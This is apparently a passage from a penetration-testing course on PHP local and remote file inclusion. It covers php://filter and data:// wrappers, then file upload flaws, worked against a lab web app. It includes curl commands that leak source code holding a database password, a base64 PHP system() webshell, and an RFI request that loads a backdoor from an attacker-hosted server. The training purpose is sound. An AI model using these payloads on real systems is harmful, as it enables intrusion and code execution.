### 9.2.1 Local File Inclusion (LFI) in Modern Applications

Local File Inclusion (LFI) vulnerabilities are less common in modern web applications because many older frameworks and server-side scripting languages are now outdated and less frequently used. Modern frameworks and languages often include built-in protections against LFI by design. However, it is important to note that LFI vulnerabilities can still be found in modern back-end JavaScript runtime environments like Node.js.

### 9.2.2 PHP Wrappers

PHP provides a variety of protocol wrappers to extend the language's capabilities. These wrappers can be used to represent and access local or remote filesystems. They can also be exploited to bypass filters or execute code via File Inclusion vulnerabilities in PHP web applications. In this section, we will focus on the `php://filter` and `data://` wrappers, though many others are available.

#### Using `php://filter`

The `php://filter` wrapper allows us to display the contents of files with or without encodings such as ROT13 or Base64. In the previous section, we covered using LFI to include the contents of files. With `php://filter`, we can display the contents of executable files, such as `.php`, rather than executing them. This is useful for reviewing PHP files for sensitive information and analyzing the web application's logic.

Let's demonstrate this with the "Mountain Desserts" web application. First, we'll provide the `admin.php` file as a value for the `page` parameter:

```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
Admin
Maintenance
The admin page is currently under maintenance.
```

Listing 147 shows the title and maintenance text we already encountered while reviewing the web application. We notice that the `<html>` tag is not closed at the end of the HTML code, suggesting that something is missing. Since PHP code is executed server-side, it is not shown in the output. By comparing this output with previous inclusions or reviewing the source code in the browser, we can conclude that the rest of the `index.php` page's content is missing.

Next, let's include the file using `php://filter` to better understand this situation. We will not use any encoding on our first attempt. The PHP wrapper uses the `resource` parameter to specify the file stream for filtering, which is the filename in our case. We can also specify absolute or relative paths in this parameter:

```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
...
Admin
Maintenance
The admin page is currently under maintenance.
```

Listing 148 shows the same result as Listing 147, which makes sense since the PHP code is included and executed via the LFI vulnerability. Now, let's encode the output with base64 by adding `convert.base64-encode`. This converts the specified resource to a base64 string:

```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
Admin
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICA8P3BocCBldGNobyAnPHNwYW4gc3R5bGU9ImNvbG9yOiNGMDA7dGV4dC1hbGlnbjpjZW50ZXI7Ij5UaGUgYWRtaW4gcGFnZSBpcyBjdXJyZW50bHkgdW5kZXIgbWFpbnRlbmFuY2UuJyA7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
```

Listing 149 shows that we included base64-encoded data, while the rest of the page loaded correctly. We can now use the `base64` program with the `-d` flag to decode the encoded data in the terminal:

```bash
kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICA8P3BocCBldGNobyAnPHNwYW4gc3R5bGU9ImNvbG9yOiNGMDA7dGV4dC1hbGlnbjpjZW50ZXI7Ij5UaGUgYWRtaW4gcGFnZSBpcyBjdXJyZW50bHkgdW5kZXIgbWFpbnRlbmFuY2UuJyA7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
...
Admin
Maintenance
The admin page is currently under maintenance.
```

#### Using `data://` Wrapper

The `data://` wrapper can be used to embed and execute data directly. For example, we can use it to execute the `ls` command:

```bash
kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
Admin
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```

Listing 152 shows that we successfully achieved code execution with the base64-encoded PHP snippet. This technique can help bypass basic filters, but it requires the `allow_url_include` setting to be enabled, which is disabled by default in all current versions of PHP.

### 9.2.3 Remote File Inclusion (RFI)

Remote File Inclusion (RFI) vulnerabilities are less common than LFIs because the target system must be configured in a specific way. In PHP web applications, the `allow_url_include` option needs to be enabled to leverage RFI, just as with the `data://` wrapper. While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB. The included file is executed in the context of the web application.

Common scenarios where this option is enabled include when the web application loads files or contents from remote systems, such as libraries or application data. We can discover RFI vulnerabilities using the same techniques covered in the Directory Traversal and LFI sections.

Kali Linux includes several PHP webshells in the `/usr/share/webshells/php/` directory that can be used for RFI. A webshell is a small script that provides a web-based command line interface, making it easier to execute commands. In this example, we will use the `simple-backdoor.php` webshell to exploit an RFI vulnerability in the "Mountain Desserts" web application.

First, let's briefly review the contents of the `simple-backdoor.php` webshell. It accepts commands in the `cmd` parameter and executes them via the `system` function:

```bash
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
...
";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "";
die;
}
?>
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```

To leverage an RFI vulnerability, we need to make the remote file accessible by the target system. We can use the Python3 `http.server` module to start a web server on our Kali machine and serve the file we want to include remotely on the target system. The `http.server` module sets the web root to the current directory of our terminal.

```bash
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

After the web server is running with `/usr/share/webshells/php/` as its current directory, we have completed all necessary steps on our attacking machine. Next, we'll use `curl` to include the hosted file via HTTP and specify `ls` as our command:

```bash
kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
...
Admin
admin.php
bavarian.php
css
fonts
img
index.php
js
```

Listing 155 shows that we successfully exploited an RFI vulnerability by including a remotely hosted webshell. We could now use Netcat again to create a reverse shell and receive an interactive shell on the target system, as in the LFI section.

### 9.3 File Upload Vulnerabilities

This Learning Unit covers the following Learning Objectives:
- Understand File Upload vulnerabilities
- Learn how to identify File Upload vulnerabilities
- Explore different vectors to exploit File Upload vulnerabilities

Many web applications provide functionality to upload files. In this Learning Unit, we will learn how to identify, exploit, and leverage File Upload vulnerabilities to access the underlying system or execute code. File Upload vulnerabilities can be grouped into three categories:

1. **Executable Files**: If we can upload a PHP script to a web server where PHP is enabled, we can execute the script by accessing it via the browser or `curl`. This type of vulnerability can also be leveraged in other frameworks or server-side scripting languages.

2. **Combined with Other Vulnerabilities**: If the web application is vulnerable to Directory Traversal, we can use a relative path in the file upload request and try to overwrite files like `authorized_keys`. Additionally, we can combine file upload mechanisms with XML External Entity (XXE) or Cross Site Scripting (XSS) attacks. For example, if we are allowed to upload an avatar with an SVG file type, we may embed an XXE attack to display file contents or even execute code.

3. **User Interaction Required**: When we discover an upload form for job applications, we can try to upload a CV in `.docx` format with malicious macros. Since this category requires a person to access our uploaded file, we will focus on the other two categories.

By understanding these categories and their exploitation methods, we can effectively identify and exploit File Upload vulnerabilities in web applications.